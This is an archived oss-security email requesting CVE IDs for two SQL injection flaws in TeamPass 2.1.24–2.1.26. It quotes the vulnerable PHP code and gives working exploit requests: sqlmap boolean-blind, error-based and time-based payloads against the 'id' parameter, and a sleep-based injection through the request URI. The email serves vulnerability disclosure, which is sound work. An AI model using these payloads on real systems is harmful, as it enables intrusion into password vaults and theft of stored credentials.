X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6398" "Monday" "11" "July" "2016" "11:14:02" "+0800" "das das" "scusec2010@gmail.com" "<CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>" "153" "[oss-security] CVE request:SQL injections in TeamPass" nil nil nil "7" "2016071103:14:02" "[oss-security] CVE request:SQL injections in TeamPass" (number mark "U       scusec2010@g Jul 11  153/6398  " thread-indent "\"[oss-security] CVE request:SQL injections in TeamPass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13922 invoked by uid 550); 11 Jul 2016 03:24:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 8132 invoked from network); 11 Jul 2016 03:14:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
        b=oGA8FCkHoLvNKZPaibQmKiLwfa5TJDpgVRXyq9rhPHn5HLIsS9qprD5w9O2tq2l7gA
         a+5y3G2eHvYIBhgFmSu/JHv5SqnimgA8zpQkpF1mZ+mt6RqTySOYAJzYI9vnEA9z82IL
         zSBNT2wmTFSiGczak+wEvG65eXi82pMGDs6WJCJV1QVN62x270OjGLX+3jXeWXBDOstu
         jQ1dAuUQ8sD6l/ShbCB0RiasDOUZuUaw3XkUXKMGT+qZ3WHPnrrdAexEOKc86VimlE0C
         UVB6VdN0B3ztmjGzqEVJ1t08q3hM2hpsgDnCaR8yvx2dzgLpsJB5AIQi2Gm4hZuEDLsM
         VkXw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to
         :content-transfer-encoding;
        bh=u8Bfwo1xn2ndIMtnSJJBZ5qaw4CP7F8S0W3I3jR2e7s=;
        b=VQoUJ6Ai5UFb0bz+WYSJg+dq5dQZPhgfTshwJuVEVU81kaKJ+0pZOek5/O1wlm3ebo
         CxWJle5Zk7qphG7H3+qjC/FoLhHaa9LtvCf79r0BXHLkpUpNF7TLeiuxKWatvMBSRR38
         O0Lw/WPsW+UknSVjhU4L6PpIM4QRUFduJn8dktYi1WaZO/mfKLHdtaJkE69VjUvb9ABK
         7TQhTUE21ZnlgpDS5/1mixCHFEEdbodRTmQFEALsmECTWZ+D98sRaaSc0mASJg0QK3wp
         bJmJgxzPRyR/wlLLRjuQSwteFo6WieMByH0yaEKXDeh2MySC/91g5X2fN8OYgQRnYu7x
         pWJA==
X-Gm-Message-State: ALyK8tIdPvkh8ZtOV78BcMCCfBwUqS//UEiHN19jAWPMditLKkhgt/YeCxW3DXcm/7uiGhoqAUakkwLRzNHbmQ==
X-Received: by 10.157.33.125 with SMTP id l58mr9412742otd.32.1468206843112;
 Sun, 10 Jul 2016 20:14:03 -0700 (PDT)
MIME-Version: 1.0
From: das das <scusec2010@gmail.com>
Date: Mon, 11 Jul 2016 11:14:02 +0800
Message-ID: <CAAjTPb_5q38hwdLzjNP+ejfhLvpNP7ny_tzCGF9diJf1zh1Pxw@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: [oss-security] CVE request:SQL injections in TeamPass

Hello,

I'd like to request CVE IDs for these issues. They were found in
TeamPass(www.teampass.net).
All the issues are found in TeamPass (2.1.26, 2.1.25, 2.1.24).
fixed:https://github.com/nilsteampassnet/TeamPass/commit/7bf6c63c4727a6ba9d=
65610e59ccbc25527a6fca

Issues detail:
#1: SQL injection vectors in sources/items.queries.php

-------------------------code_start TeamPass-2.1.26-------------------------
case "send_email":
            if ($_POST['key'] !=3D $_SESSION['key']) {
                echo '[{"error" : "something_wrong"}]';
                break;
            } else {
                if (!empty($_POST['content'])) {
                    $content =3D explode(',', $_POST['content']);
                }
                // get links url
                if (empty($_SESSION['settings']['email_server_url'])) {
                    $_SESSION['settings']['email_server_url'] =3D
$_SESSION['settings']['cpassman_url'];
                }
                if ($_POST['cat'] =3D=3D "request_access_to_author") {
                    $dataAuthor =3D DB::queryfirstrow("SELECT
email,login FROM ".prefix_table("users")." WHERE id=3D ".$content[1]);
                    $dataItem =3D DB::queryfirstrow("SELECT label FROM
".prefix_table("items")." WHERE id=3D ".$content[0]);
                    $ret =3D @sendEmail(
                        $LANG['email_request_access_subject'],
                        str_replace(array('#tp_item_author#',
'#tp_user#', '#tp_item#'), array(" ".addslashes($dataAuthor['login']),
addslashes($_SESSION['login']), addslashes($dataItem['label'])),
$LANG['email_request_access_mail']),
                        $dataAuthor['email']
                    );
                } elseif ($_POST['cat'] =3D=3D "share_this_item") {
                    $dataItem =3D DB::queryfirstrow("SELECT
label,id_tree FROM ".prefix_table("items")." WHERE id=3D
".$_POST['id']);
                    // send email
                    $ret =3D @sendEmail(
                        $LANG['email_share_item_subject'],
                        str_replace(
                            array('#tp_link#', '#tp_user#', '#tp_item#'),

array($_SESSION['settings']['email_server_url'].'/index.php?page=3Ditems&gr=
oup=3D'.$dataItem['id_tree'].'&id=3D'.$_POST['id'],
addslashes($_SESSION['login']), addslashes($dataItem['label'])),
                            $LANG['email_share_item_mail']
                        ),
                        $_POST['receipt']
                    );
                }
                echo '[{'.$ret.'}]';
            }
            break;
-------------------------code_end TeamPass-2.1.26--------------------------

In the "send_email" request, when the condition "$_POST['cat'] =3D=3D
"share_this_item"" is successful, the POST parameter "id" is unescaped
which leads to sql injection. while is checks the sessions at the
beginning of the script and needs the authority of normal user to
access to the page. To execute the SQL query,it verifies that if the
the post parameter'key' equals session['key'].We can get the key
through thisway=EF=BC=9Arefresh the page(e.g index.php?page=3Ditems), captu=
re
the packet using tools (e.g Burp Suit), and forward the packet,then we
canget the value of session 'key' in the request body.
e.p
http://localhost:8088/code_audit/TeamPass/sources/items.queries.php
POST:
type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia1laeyi9doh6G&=
cat=3Dshare_this_item&id=3D1*
Sqlmap payload:
sqlmap identified the following injection point(s) with a total of 406
HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
or GROUP BY clause
    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
RLIKE (SELECT (CASE WHEN (7565=3D7565) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >=3D 5.1 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (EXTRACTVALUE)
    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
AND EXTRACTVALUE(4196,CONCAT(0x5c,0x7162766271,(SELECT
(ELT(4196=3D4196,1))),0x716b706271))

    Type: AND/OR time-based blind
    Title: MySQL <=3D 5.0.11 AND time-based blind (heavy query)
    Payload: type=3Dsend_email&key=3Dwiesu2Gae8shaeNgeengeiha2aic2ohghainia=
1laeyi9doh6G&cat=3Dshare_this_item&id=3D1
AND 7783=3DBENCHMARK(5000000,MD5(0x44794d4a))
---


#2: SQL injection vectors in
includes/libraries/Database/Meekrodb/db.class.php

-------------------------code_start TeamPass-2.1.26-------------------------
// ----- BEGIN ERROR HANDLING
    if (!$sql || $db->error) {
      if ($this->error_handler) {
        $db_error =3D $db->error;
        $db_errno =3D $db->errno;
$db->query(
"INSERT INTO ".$GLOBALS['pre']."log_system SET
date=3D".time().",
qui=3D".$_SESSION['user_id'].",
label=3D'Query: ".addslashes($sql)."<br />Error:
".addslashes($db_error)."<br />@ ".$_SERVER['REQUEST_URI']."',
type=3D'error'",
MYSQLI_USE_RESULT
);
-------------------------code_end TeamPass-2.1.26--------------------------
When a database error occurs, these codes above will be excuted.
However, the variable "$_SERVER['REQUEST_URI']" is unescaped and
controled by us which lead to a sql injection. First we need to find a
place where database error occurs, such as
"sources/import.queries.php". It needs a normal user authority to
access to the page. Then use the burpsuit to access the page to avoid
the urlencode by browsers.
e.p
http://localhost:8088/TeamPass/sources/import.queries.php?'or/**/sleep(5)/*=
*/or'1
POST:
type=3Dimport_items&data=3D&folder=3D1
And the sql log is as below. It is a time-based sql injection.
-------------------------log_start-------------------------
Query INSERT INTO teampass_log_system SET
date=3D1466674179,
qui=3D10000001,
label=3D'Query: INSERT INTO `teampass_items`
(`label`,`description`,`pw`,`pw_iv`,`url`,`id_tree`,`login`,`anyone_can_mod=
ify`)
VALUES (\'\', NULL, \'\', \'dfd7c5279cdd697c08b627aeaaf15999\', NULL,
\'1\', NULL, 0)<br />Error: Column \'description\' cannot be null<br
/>@ /code_audit/TeamPass/sources/import.queries.php?'or/**/sleep(5)/**/or'1=
',
type=3D'error'
-------------------------log_end---------------------------


These issues were discovered by wps2015[D.A.S] of Information Security
Institute @ Sichuan University.
